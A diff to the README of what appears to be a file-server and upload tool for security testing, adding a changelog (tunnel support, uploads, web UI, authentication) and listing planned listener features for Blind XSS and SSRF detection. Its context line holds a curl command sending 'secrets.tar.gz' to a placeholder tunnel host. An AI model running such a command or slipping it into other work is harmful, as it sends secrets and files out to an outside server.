@@ -219,8 +219,33 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 - [ ] Listener module (e.g., for Blind XSS or SSRF detection)
 - [ ] Integrate with Interactsh or Burp Collaborator
  
- 
+# CHANGELOG
+## [1.3.2] - 2025-11-08
 
+### Added
+- Improved `localtunnel` instructions with public IP display and bypass guidance.
+
+## [1.3.1] - 2025-11-06
+
+### Added
+- Added 'Copy All' button to preview modal to copy file contents.
+
+## [1.3.0] - 2025-11-03
+
+### Added
+- Support for Localtunnel.
+- File upload functionality.
+- Metadata extraction for files.
+- A web UI with dark, light, and hacker modes.
+- Self-updating mechanism.
+- Easy installation to /usr/local/bin.
+- Verbose mode for detailed output.
+- Timeout option to automatically shut down the server.
+- Basic authentication to protect the server.
+
+### Changed
+- Improved the banner.
+- Enhanced logging to include more details.
 ---
 
 ## 🙌 Contributing
